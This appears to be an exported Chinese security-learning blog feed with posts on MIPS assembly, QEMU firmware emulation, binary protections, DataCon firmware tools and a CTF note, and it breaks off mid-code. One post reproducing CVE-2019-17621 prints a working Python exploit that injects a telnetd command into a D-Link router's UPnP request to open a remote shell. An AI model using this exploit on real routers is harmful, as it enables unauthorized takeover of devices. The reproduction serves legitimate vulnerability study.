bash<br></code></pre></td></tr></table></figure><p>angr的简单例子</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">import</span> angr<br><span class="hljs-meta">&gt;&gt;&gt; </span>proj = angr.Project(<span class="hljs-string">&#x27;/bin/true&#x27;</span>) <span class="hljs-comment"># /bin/true是linux的一个永远return 0的程序</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">import</span> monkeyhex <span class="hljs-comment"># 将输出转为16进制，但是docker里并不自带，要pip install一下</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>proj.arch<br>&lt;Arch AMD64 (LE)&gt;<br><span class="hljs-meta">&gt;&gt;&gt; </span>proj.entry<br><span class="hljs-number">0x401670</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>proj.filename<br><span class="hljs-string">&#x27;/bin/true&#x27;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>fuzz</category>
      
    </categories>
    
    
    <tags>
      
      <tag>fuzz</tag>
      
      <tag>afl</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>程序保护机制</title>
    <link href="/2023/03/14/ctf-pwn/%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/"/>
    <url>/2023/03/14/ctf-pwn/%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/</url>
    
    <content type="html"><![CDATA[<h2 id="NX"><a href="#NX" class="headerlink" title="NX"></a>NX</h2><p>栈不可执行 no execute</p><p>同DEP，数据执行保护。</p><h2 id="Stack-Canary"><a href="#Stack-Canary" class="headerlink" title="Stack Canary"></a>Stack Canary</h2><p>栈中加一个随机数，在函数执行完返回之前，检查这个随机数是否改变来判断是否栈溢出</p><h2 id="PIE与ASLR"><a href="#PIE与ASLR" class="headerlink" title="PIE与ASLR"></a>PIE与ASLR</h2><p>ASLR随机堆、栈、mmap的地址</p><p>PIE随机数据段、代码段的地址</p><h2 id="Relro"><a href="#Relro" class="headerlink" title="Relro"></a>Relro</h2><p>relocation read-only 重定向只读</p><p>开启之后got表不可写</p>]]></content>
    
    
    <categories>
      
      <category>ctf-pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>mips的堆栈</title>
    <link href="/2022/12/23/mips%E6%B1%87%E7%BC%96/mips%E5%A0%86%E6%A0%88/"/>
    <url>/2022/12/23/mips%E6%B1%87%E7%BC%96/mips%E5%A0%86%E6%A0%88/</url>
    
    <content type="html"><![CDATA[<h4 id="MIPS的栈💣"><a href="#MIPS的栈💣" class="headerlink" title="MIPS的栈💣"></a>MIPS的栈💣</h4><ol><li><p>栈增长方向：同x86，向低地址增长</p></li><li><p>没有EBP指针（但是有一个fp，见MIPS汇编这篇文章）</p></li><li><p>传参：前四个参数通过$a0~$a3传递，多出的参数放入栈空间</p></li><li><p>返回值：$RA寄存器 </p></li></ol><h4 id="mips与x86函数调用区别"><a href="#mips与x86函数调用区别" class="headerlink" title="mips与x86函数调用区别"></a>mips与x86函数调用区别</h4><ol><li>将$PC寄存器移到$RA寄存器</li><li>如果被调用的函数是如果是非叶函数（调用其他函数），将$RA存在栈；叶函数则不变</li><li>函数返回时，叶函数直接 <code>jr $RA</code>，非叶函数先把返回地址存入$RA再跳转</li></ol><p>《家用路由器0day漏洞挖掘》这本书上的图例：</p><p><img src="/img/mips/1.jpg"></p><h4 id="主调函数干的事"><a href="#主调函数干的事" class="headerlink" title="主调函数干的事"></a>主调函数干的事</h4><h5 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h5><ol><li><p>创建 <code>more argument.c</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-comment">//more argument.c</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">more_arg</span><span class="hljs-params">(<span class="hljs-type">int</span> a,<span class="hljs-type">int</span> b,<span class="hljs-type">int</span> c,<span class="hljs-type">int</span> d,<span class="hljs-type">int</span> e)</span><br>&#123;<br>    <span class="hljs-type">char</span> dst[<span class="hljs-number">100</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-built_in">sprintf</span>(dst,<span class="hljs-string">&quot;%d%d%d%d%d\n&quot;</span>,a,b,c,d,e);<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">int</span> a1=<span class="hljs-number">1</span>;<br>    <span class="hljs-type">int</span> a2=<span class="hljs-number">2</span>;<br>    <span class="hljs-type">int</span> a3=<span class="hljs-number">3</span>;<br>    <span class="hljs-type">int</span> a4=<span class="hljs-number">4</span>;<br>    <span class="hljs-type">int</span> a5=<span class="hljs-number">5</span>;<br>    more_arg(a1,a2,a3,a4,a5);<br>    <span class="hljs-keyword">return</span> ;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>编译</p><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos">mips-linux-gnu-gcc ./<span class="hljs-built_in">more</span>\ argument.c  -o   <span class="hljs-built_in">more</span>\ argument<br></code></pre></td></tr></table></figure></li><li><p>ida打开</p><p>首先可以看到前四个参数存入了$a0~$a3</p><p><img src="/img/mips/2.jpg"></p><p>然后前面5个：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">li      $v0, ?<br>sw      $v0, 0x??+var_18($fp)<br></code></pre></td></tr></table></figure><p>是赋值操作，因此中间的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">lw      $v0, 0x38+var_8($fp)<br>sw      $v0, 0x38+var_28($sp)<br></code></pre></td></tr></table></figure><p>即为第五个参数的传递</p></li></ol><h4 id="被调函数干的事"><a href="#被调函数干的事" class="headerlink" title="被调函数干的事"></a>被调函数干的事</h4><p>被调用函数的开头干了以下几件事（仅针对非叶函数）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">addiu   $sp, -0x40<br>sw      $ra, 0x38+var_s4($sp)<br>sw      $fp, 0x38+var_s0($sp)<br>move    $fp, $sp<br></code></pre></td></tr></table></figure><p>首先，抬高sp 0x40个字节<em><strong>（这里0x40是随便写的）</strong></em>。然后将ra放到<code>sp + 0x38 + 4</code>，fp放到<code>sp + 0x38 + 0</code>的位置，也就是被调函数的栈底为ra，然后是fp。最后将fp赋值为sp。</p><p>然后需要对参数进行处理，arg_0 到arg_C是主调函数预留出来的空间，需要被调函数再把$a0-$a3存入进去，然后arg_10本身主调函数就已经存好了第五个参数，不需要动。</p><p><img src="/img/mips/3.jpg"></p><p>最终主调和被调函数的栈长这样：</p><p><img src="/img/mips/4.jpg"></p>]]></content>
    
    
    <categories>
      
      <category>mips汇编</category>
      
    </categories>
    
    
    <tags>
      
      <tag>assembly</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>mip汇编</title>
    <link href="/2022/12/23/mips%E6%B1%87%E7%BC%96/mips%E6%B1%87%E7%BC%96/"/>
    <url>/2022/12/23/mips%E6%B1%87%E7%BC%96/mips%E6%B1%87%E7%BC%96/</url>
    
    <content type="html"><![CDATA[<h2 id="MIPS汇编"><a href="#MIPS汇编" class="headerlink" title="MIPS汇编"></a>MIPS汇编</h2><ol><li><p>寄存器</p><p>32个，$0 ~ $31，每个寄存器具体作用见 <a href="https://ctf-wiki.org/assembly/mips/readme/">https://ctf-wiki.org/assembly/mips/readme/</a></p><p>常见的包括：</p></li></ol><table><thead><tr><th align="center">寄存器</th><th align="center">作用</th></tr></thead><tbody><tr><td align="center">$0</td><td align="center">恒定为0</td></tr><tr><td align="center">$4 - $7</td><td align="center">函数参数，通常也叫$a0 - $a3</td></tr><tr><td align="center">$29</td><td align="center">$sp，栈顶</td></tr><tr><td align="center">$30</td><td align="center">$fp，栈帧</td></tr><tr><td align="center">$31</td><td align="center">$ra，返回地址</td></tr></tbody></table><p>除了这32个寄出器，还有$PC和 HI、LO</p><ol start="2"><li><p>指令</p><p>MIPS指令为load-store架构，操作数必须先从内存中读取到寄存器里才能运算，<strong>不能直接操作内存</strong></p><table><thead><tr><th align="center">指令</th><th align="center">内容</th></tr></thead><tbody><tr><td align="center">beq</td><td align="center">branch on equal</td></tr><tr><td align="center">bgez</td><td align="center">branch on greater than or euqal to zero （≥0跳转）</td></tr><tr><td align="center">bgezal</td><td align="center">（al = and link）  $ra设置为下一条指令然后跳转，相当于跳转到一个函数</td></tr><tr><td align="center">bgtz</td><td align="center">branch on greater than zero （＞0跳转）</td></tr><tr><td align="center">bne</td><td align="center">branch on not equal</td></tr><tr><td align="center">jal</td><td align="center">jump and link 过程调用，会将$ra设置为下一条指令</td></tr></tbody></table><p>运算：乘法会将结果高32位存入HI，低32位存入LO</p><p>​            除法会将余数存入HI，商存入LO</p><p>三个操作数，都是将右边两个的计算存入左边的，例如 or $d,$s,$t ，d = s | t</p></li></ol>]]></content>
    
    
    <categories>
      
      <category>mips汇编</category>
      
    </categories>
    
    
    <tags>
      
      <tag>assembly</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>qemu的安装与仿真第一个mips程序</title>
    <link href="/2022/12/23/%E5%9B%BA%E4%BB%B6%E4%BB%BF%E7%9C%9F/%E5%A6%82%E4%BD%95%E7%94%A8qemu%E4%BB%BF%E7%9C%9Fmips%E7%A8%8B%E5%BA%8F/"/>
    <url>/2022/12/23/%E5%9B%BA%E4%BB%B6%E4%BB%BF%E7%9C%9F/%E5%A6%82%E4%BD%95%E7%94%A8qemu%E4%BB%BF%E7%9C%9Fmips%E7%A8%8B%E5%BA%8F/</url>
    
    <content type="html"><![CDATA[<h4 id="QEMU安装"><a href="#QEMU安装" class="headerlink" title="QEMU安装"></a>QEMU安装</h4><p>QEMU仿真程序分为两类：使用者模式（User Mode）、系统模式（System Mode）。区别在于User Mode只仿真单个程序，而System Mode仿真整个计算机系统，类似vmware</p><h5 id="使用者模式"><a href="#使用者模式" class="headerlink" title="使用者模式"></a>使用者模式</h5><p>安装：<code>sudo apt-get install qemu-user[-static]</code></p><p>使用（以mips为例）：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">cd &lt;path-to-fsroot&gt;<br>cp $(which qemu-mipsel-static) ./<br>sudo chroot . ./qemu-mipsel-static &lt;path-to-elf&gt;<br></code></pre></td></tr></table></figure><p>对于32位小端序（LSB）程序，使用<code>qemu-mipsel</code>来仿真，32位MSB程序，使用<code>qemu-mips</code>来仿真</p><p>一个小端序的仿真示例：</p><p><img src="/img/qemu/1.jpg"></p><blockquote><p>Q1：为什么要加 -static ？</p><p>A1：xxx-static表示使用静态链接的qemu程序，不依赖外部动态链接程序，由于使用是要chroot改变根目录，原本的动态链接库会无法找到，除非使用ldd命令把所有依赖全都复制到新的根目录下，否则无法运行。</p><p>而且真的复制动态链接库过来可能会和原本存在的文件重名（我猜的，没验证过😅）</p></blockquote><h5 id="系统模式"><a href="#系统模式" class="headerlink" title="系统模式"></a>系统模式</h5><p>不管了，直接用fap或者firmae</p>]]></content>
    
    
    <categories>
      
      <category>固件仿真</category>
      
    </categories>
    
    
    <tags>
      
      <tag>firmware analysis</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2019-17621 dlink-822 命令注入漏洞复现</title>
    <link href="/2022/12/17/%E5%9B%BA%E4%BB%B6%E4%BB%BF%E7%9C%9F/CVE-2019-17621/"/>
    <url>/2022/12/17/%E5%9B%BA%E4%BB%B6%E4%BB%BF%E7%9C%9F/CVE-2019-17621/</url>
    
    <content type="html"><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>第一次成功仿真一个固件并成功访问web并成功复现漏洞的exp ……</p><p>期间用 firmware-analysis-toolkit 和 firmware-analysis-plus （包括它的docker）在不同的操作系统（kali2020.4，kali2022.4）上来回实验了各种各样的固件，最终的成功目前看来只是一个偶然（因为遇到了太多我目前无法解释的问题）特此记录一下😪</p><h4 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h4><p>kali2020.4 （同样的固件，同样版本的fap，但是在kali2022.4上运行这个固件时，会Internal Error 500（但起码能访问到这个ip……😅）</p><p>固件下载地址：<a href="http://support.dlink.com.cn:9000/ProductInfo.aspx?m=DIR-822">http://support.dlink.com.cn:9000/ProductInfo.aspx?m=DIR-822</a></p><p>就这一个版本1.03B03</p><p><img src="/img/CVE-2019-17621/1.jpg"></p><p>fap使用的是2.3版本 <a href="https://github.com/liyansong2018/firmware-analysis-plus/tree/v2.3">https://github.com/liyansong2018/firmware-analysis-plus/tree/v2.3</a></p><p>使用的exp来源 <a href="https://www.jianshu.com/p/409106be87b7">https://www.jianshu.com/p/409106be87b7</a></p><h4 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h4><p><img src="/img/CVE-2019-17621/2.jpg"></p><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> sleep<br><span class="hljs-comment"># Exploit By Miguel Mendez &amp; Pablo Pollanco</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">httpSUB</span>(<span class="hljs-params">server, port, shell_file</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\n[*] Connection &#123;host&#125;:&#123;port&#125;&#x27;</span>).<span class="hljs-built_in">format</span>(host=server, port=port)<br>    con = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>    request = <span class="hljs-string">&quot;SUBSCRIBE /gena.cgi?service=&quot;</span> + <span class="hljs-built_in">str</span>(shell_file) + <span class="hljs-string">&quot; HTTP/1.0\n&quot;</span><br>    request += <span class="hljs-string">&quot;Host: &quot;</span> + <span class="hljs-built_in">str</span>(server) + <span class="hljs-built_in">str</span>(port) + <span class="hljs-string">&quot;\n&quot;</span><br>    request += <span class="hljs-string">&quot;Callback: &lt;http://192.168.0.4:34033/ServiceProxy27&gt;\n&quot;</span><br>    request += <span class="hljs-string">&quot;NT: upnp:event\n&quot;</span><br>    request += <span class="hljs-string">&quot;Timeout: Second-1800\n&quot;</span><br>    request += <span class="hljs-string">&quot;Accept-Encoding: gzip, deflate\n&quot;</span><br>    request += <span class="hljs-string">&quot;User-Agent: gupnp-universal-cp GUPnP/1.0.2 DLNADOC/1.50\n\n&quot;</span><br>    sleep(<span class="hljs-number">1</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[*] Sending Payload&#x27;</span>)<br>    con.connect((socket.gethostbyname(server),port))<br>    con.send(request.encode())<br>    results = con.recv(<span class="hljs-number">4096</span>)<br>    sleep(<span class="hljs-number">1</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[*] Running Telnetd Service&#x27;</span>)<br>    sleep(<span class="hljs-number">1</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[*] Opening Telnet Connection\n&#x27;</span>)<br>    sleep(<span class="hljs-number">2</span>)<br>    os.system(<span class="hljs-string">&#x27;telnet &#x27;</span> + <span class="hljs-built_in">str</span>(server) + <span class="hljs-string">&#x27; 9999&#x27;</span>)<br>serverInput = raw_input(<span class="hljs-string">&#x27;IP Router: &#x27;</span>)<br>portInput = <span class="hljs-number">49152</span><br>httpSUB(serverInput, portInput, <span class="hljs-string">&#x27;`telnetd -p 9999 &amp;`&#x27;</span>)<br></code></pre></td></tr></table></figure><h4 id="坑"><a href="#坑" class="headerlink" title="坑"></a>坑</h4><p>这是第一次仿真固件，一开始用的是firmware-analysis-toolkit（fat，<a href="https://github.com/attify/firmware-analysis-toolkit">https://github.com/attify/firmware-analysis-toolkit</a>），首先它安装的时候就一堆问题。包括它的setup.sh里，要安装个lsb-core，但是apt找不到这个包，上网找了半天没找到一个能成功安装的，然后在他的issue里发现有人说这个不是必要的，可以删掉😅，然后setp.sh里还有个qt5base-dev的包，在kali上实际应该是qtbase5-dev😅，我不知道其他系统是啥样，还有一个坑是因为git  clone不稳定，我手动下载的zip包，但实际上这个clone是要recursive的😅，直接运行fat.py他是用pexpect去开启另一个进程，然后新启动的这个进程并不会把输出显示过来，看源码调试半天才发现是少文件，当时还很纳闷😅为啥会少（过于nc）</p><p>相对来说firmware-analysis-plus（fap，<a href="https://github.com/liyansong2018/firmware-analysis-plus">https://github.com/liyansong2018/firmware-analysis-plus</a>）比较友好（和fat基本一样，只不过细节上做了一些修改），首先，其他项目的文件统一放在了库里（没有那个递归了😅）然后还做了一个docker，但是这个docker没有装jefferson，仿真不了jffs的文件系统，只能继续自己配环境😅。fat.py后面要加一个-q qemu-path的参数，否则network  interface列表会为空（nc如我还跑去人家issue底下问，还好人家没过几分钟就回复了😅）</p><p>然后exp部分一开始我用的这个帖子的exp ：<a href="http://www.manongzj.com/blog/28-tkbcqqitdf.html">http://www.manongzj.com/blog/28-tkbcqqitdf.html</a>，跑不通，后来换成了前文用的exp，居然好使了。。。我没看出来这俩exp有啥区别，不想管了😅，第一次固件仿真到此结束，漏洞是啥原理暂时不想管了</p>]]></content>
    
    
    <categories>
      
      <category>固件仿真</category>
      
    </categories>
    
    
    <tags>
      
      <tag>firmware analysis</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>菜鸡的2022datacon记录</title>
    <link href="/2022/12/11/%E6%9D%82%E9%A1%B9/%E8%8F%9C%E9%B8%A1%E7%9A%842022datacon/"/>
    <url>/2022/12/11/%E6%9D%82%E9%A1%B9/%E8%8F%9C%E9%B8%A1%E7%9A%842022datacon/</url>
    
    <content type="html"><![CDATA[<h4 id="固件基地址识别"><a href="#固件基地址识别" class="headerlink" title="固件基地址识别"></a>固件基地址识别</h4><p>rbasefind - <a href="https://github.com/sgayou/rbasefind">https://github.com/sgayou/rbasefind</a></p><p>此项目用rust写的，用<code>cargo build</code>之后会生成可执行文件在<code>target</code>路径下</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">rbasefind &lt;<span class="hljs-type">path</span>-<span class="hljs-keyword">to</span>-bin&gt; <br></code></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs sh">Located 4052 strings<br>Located 197089 pointers<br>Scanning with 2 threads...<br>0x2c0dc000: 3818<br>0x2c0dd000: 280<br>0x2c0db000: 274<br>0x2c0da000: 232<br>0x2c0de000: 228<br>0x2c0d7000: 202<br>0x2c0d9000: 200<br>0x2c0df000: 199<br>0x2c0e1000: 184<br>0x2c0e6000: 181<br></code></pre></td></tr></table></figure><p>通常来讲第一行（也就是数字最大的那个）为固件的基地址，但是很多时候识别不出来（比如几行都是1）</p><p>实际在datacon的数据上测试的结果，使用的时候所有参数都是default（因为当时并没有仔细看代码….）</p><p><img src="/img/datacon/1.jpg"></p><p>应该是50个固件识别成功了38个</p><h5 id="对rbasefind源码的分析"><a href="#对rbasefind源码的分析" class="headerlink" title="对rbasefind源码的分析"></a>对rbasefind源码的分析</h5><p>按程序执行顺序分析</p><ol><li><p><code>get_strings()</code></p><p>利用一个正则表达式匹配</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">[ -~<span class="hljs-symbol">\t</span>\r<span class="hljs-symbol">\n</span>]&#123;10,&#125;  // 从空格(48)到制表符(126) 以及 \r<span class="hljs-symbol">\n</span> 的所有有效字符 <br></code></pre></td></tr></table></figure><p>长度至少是10的字符串（10为参数minstrlen，最小字符串搜索长度）</p></li><li><p><code>get_pointers()</code></p><p>提取整个文件的u32（？），会根据参数<code>big_endian</code>判断文件的大小端</p></li><li><p><code>find_match() -&gt; Interval::get_range()</code></p><p>把32位地址空间平均分为n部分，n位参数的threads（开启的线程数）</p></li><li><p>每一个interval对应一个线程，以offset字节为一组（offset为输入的参数，默认为4096）</p></li><li><p>下面的代码中current_addr遍历了<code> [interval.start_addr : interval.end_addr : offset]</code></p><p>将每个str的首地址加上current_addr，把这些地址和pointers集合取交集</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">while</span> current_addr &lt;= interval.end_addr &#123;<br>    <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">news</span> = FnvHashSet::<span class="hljs-title function_ invoke__">default</span>();<br>    <span class="hljs-keyword">for</span> <span class="hljs-variable">s</span> <span class="hljs-keyword">in</span> strings &#123;<br>        <span class="hljs-keyword">match</span> s.<span class="hljs-title function_ invoke__">checked_add</span>(current_addr) &#123;<br>            <span class="hljs-title function_ invoke__">Some</span>(add) =&gt; news.<span class="hljs-title function_ invoke__">insert</span>(add),<br>            <span class="hljs-literal">None</span> =&gt; <span class="hljs-keyword">continue</span>,<br>        &#125;;<br>    &#125;<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">intersection</span>: FnvHashSet&lt;_&gt; = news.<span class="hljs-title function_ invoke__">intersection</span>(pointers).<span class="hljs-title function_ invoke__">collect</span>();<br>    <span class="hljs-keyword">if</span> !intersection.<span class="hljs-title function_ invoke__">is_empty</span>() &#123;<br>        heap.<span class="hljs-title function_ invoke__">push</span>((intersection.<span class="hljs-title function_ invoke__">len</span>(), current_addr));<br>    &#125;<br>    <span class="hljs-keyword">match</span> current_addr.<span class="hljs-title function_ invoke__">checked_add</span>(config.offset) &#123;<br>        <span class="hljs-title function_ invoke__">Some</span>(_) =&gt; current_addr += config.offset,<br>        <span class="hljs-literal">None</span> =&gt; <span class="hljs-keyword">break</span>,<br>    &#125;;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>取出交集size最大的top n个current_addr进行输出</p><p>见本节最开头的示例，输出格式为 addr :  interaction_size</p><p>size最大的即认为是最有可能的基地址</p><p><strong>目前尚不清楚这样做的道理是什么</strong></p><p>猜测：首先，基地址是一个offset的倍数，那么遍历0~2^32所有offset的倍数（也就是current_offset），字符串在程序运行时会被装载到基地址后面的一段空间内，而pointers里会有很多指向字符串真实地址的指针，如果能将strings和pointers匹配上很多，说明这个current_addr就是程序的基地址</p><p>（纯瞎猜💔）</p></li></ol><h4 id="函数符号恢复"><a href="#函数符号恢复" class="headerlink" title="函数符号恢复"></a>函数符号恢复</h4><h5 id="几个已知的方法"><a href="#几个已知的方法" class="headerlink" title="几个已知的方法"></a>几个已知的方法</h5><p>我认为这篇文章写的很不错 <a href="https://blog.csdn.net/abel_big_xu/article/details/124388798">https://blog.csdn.net/abel_big_xu/article/details/124388798</a></p><ol><li><p>FLIRT</p><p>ida自带的一个插件，FLIRT可以对某个静态函数库生成签名，然后和待分析的程序匹配</p><p>缺点在于需要已知库函数文件</p></li><li><p>lscan   </p><p><a href="https://github.com/maroueneboubakri/lscan">https://github.com/maroueneboubakri/lscan</a>（我和前面挂着的那篇csdn文章作者一样，没搞懂这个工具）</p><p>lscan算是对flirt进行了一个包装，只要把一堆静态库放在一个文件夹里，他会遍历这个文件夹对每个静态库生成签名，然后再用FLIRT进行比对</p><p>lscan项目里自带的一些静态库是可以成功运行的，但是我试了一下写的静态库，例如sigdatabase <a href="https://github.com/push0ebp/sig-database">https://github.com/push0ebp/sig-database</a> 运行会报错</p><p>然后还有一个很奇怪的点在于匹配时对于某个库的相似度会超过百分之100%（在lscan的issue里也有人提到），但实际用ida的flirt打开时这个库并不能很好地匹配分析文件</p></li><li><p>Rizzo</p><p>没实际测试过，略</p></li><li><p>finger</p><p>finger是阿里云开发的ida插件  -  <a href="https://github.com/aliyunav/Finger">https://github.com/aliyunav/Finger</a></p><p>用起来很简单</p></li><li><p>lumina </p><p>没有测试过，ida的一个官方符号识别插件，需要远程连接到ida lumina的服务器</p><p>有一个山寨版的服务器lumen，可以替代lumina，但好像现在已经不好使了</p></li></ol><h5 id="在datacon符号恢复数据集上的实测"><a href="#在datacon符号恢复数据集上的实测" class="headerlink" title="在datacon符号恢复数据集上的实测"></a>在datacon符号恢复数据集上的实测</h5><p>给了20个程序，只有一个x86的程序，用finger基本能识别出来，有几个arm、mips的程序，还有其他很多奇奇怪怪的平台ida都反汇编不了，跟不用说符号恢复了，寄</p><h4 id="powershell反混淆"><a href="#powershell反混淆" class="headerlink" title="powershell反混淆"></a>powershell反混淆</h4><p>PowerDecode  -  <a href="https://github.com/Malandrone/PowerDecode">https://github.com/Malandrone/PowerDecode</a></p><p>对于单个文件反混淆很好用，而且实测比下边那个工具效果要好</p><p>但是问题在于，它提供的“分析整个文件夹下所有文件”功能，输出结果全是 1.txt 2.txt 3.txt …..</p><p>然后这些txt里也看不出来对应着哪个pwsh脚本，一开始想着是不是文件名称排列的顺序，但好像不对，代码全是powershell写的，也没搞懂该咋办</p><p>因此只能换了第二个工具</p><p>PSDecode - <a href="https://github.com/R3MRUM/PSDecode">https://github.com/R3MRUM/PSDecode</a> </p><p>会在TEMP路径下留下解析过程中各个layer的数据</p><p><img src="/img/datacon/2.jpg"></p>]]></content>
    
    
    <categories>
      
      <category>杂项</category>
      
    </categories>
    
    
    <tags>
      
      <tag>exp</tag>
      
      <tag>datacon</tag>
      
      <tag>iot-sec</tag>
      
      <tag>powershell</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>遇到的奇奇怪怪问题汇总</title>
    <link href="/2022/11/29/%E6%9D%82%E9%A1%B9/%E9%81%87%E5%88%B0%E7%9A%84%E5%A5%87%E5%A5%87%E6%80%AA%E6%80%AA%E9%97%AE%E9%A2%98%E6%B1%87%E6%80%BB/"/>
    <url>/2022/11/29/%E6%9D%82%E9%A1%B9/%E9%81%87%E5%88%B0%E7%9A%84%E5%A5%87%E5%A5%87%E6%80%AA%E6%80%AA%E9%97%AE%E9%A2%98%E6%B1%87%E6%80%BB/</url>
    
    <content type="html"><![CDATA[<p><strong>vmware自带的vmtools安装了也复制不进来</strong></p><p>虚拟机执行命令</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">sudo apt-<span class="hljs-built_in">get</span> install <span class="hljs-keyword">open</span>-<span class="hljs-keyword">vm</span>-tools-desktop<br></code></pre></td></tr></table></figure><p>如果拖放文件的时候出现了</p><p><img src="/img/problems/1.jpg"></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">sudo gedit <span class="hljs-regexp">/etc/g</span>dm3/custom.conf<br></code></pre></td></tr></table></figure><p>将<code>WaylandEnable=false</code>注释掉</p><p>据说是vmware还没有支持ubutnu22.04的默认桌面Wayland</p><h4 id="sleep-？"><a href="#sleep-？" class="headerlink" title="sleep ？"></a>sleep ？</h4><p>题目：</p><p><a href="https://buuoj.cn/challenges#mrctf2020_easyrop">https://buuoj.cn/challenges#mrctf2020_easyrop</a></p><p>本来是很简单的一个溢出</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 